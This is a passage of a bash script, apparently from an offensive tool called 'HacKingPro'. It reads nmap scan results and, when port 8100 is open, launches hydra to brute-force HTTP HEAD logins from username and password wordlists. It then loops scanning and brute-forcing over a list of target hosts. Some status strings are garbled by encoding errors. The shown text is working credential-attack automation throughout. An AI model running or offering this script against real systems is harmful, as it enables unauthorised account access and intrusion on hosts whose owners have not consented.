  BruteHTTP8080

  #  Port 8100 (HTTP HEAD)
  BruteHTTP8100(){
    if grep -q 8100/tcp ${targetNAME}-HacKingPro-nmap.log ; then
      echo "        ${BBlue}â””â”€â”€[${BRed} ğŸ¯ ${BBlue}]â”€â”€â•¼ ${BGreen} Port 8100(HTTP HEAD) is open. Starting bruteforce...\n"
      sleep 1
      hydra -L $user -P $pass ${targetIP} http-head -S 8100 -f -q -e ns -o Output/${targetIP}/http-head_8100_${targetIP}.txt -I -V -m / -t $thread
      Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}â””â”€â”€[${BRed} âŒ ${BBlue}]â”€â”€â•¼ ${BRed} Port 8100(HTTP HEAD) is not open. Quitting..."
    fi
  }
  BruteHTTP8100

  Press_ENTER

  if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
  	help
  	exit
  fi

  if [ ! -z "$2" ]; then
  	if [ "$2" -gt "64" ] || [ "$2" -lt "1" ]; then
  		echo "[${red}!${default}] Maximum number of threads is 64!"
  		exit
  	else
  		thread=$2
  	fi
  fi

  if [[ -f $1 ]]; then
  	while IFS= read -r line; do
  		sleep 1
  		report $line
  		port_scan $line
  		BrutePort $line $2
  	done < "$1"
  	exit
  fi

  # sleep 1
  # report $1
  # port_scan $1
  # BrutePort $1 $2

  Press_ENTER


}
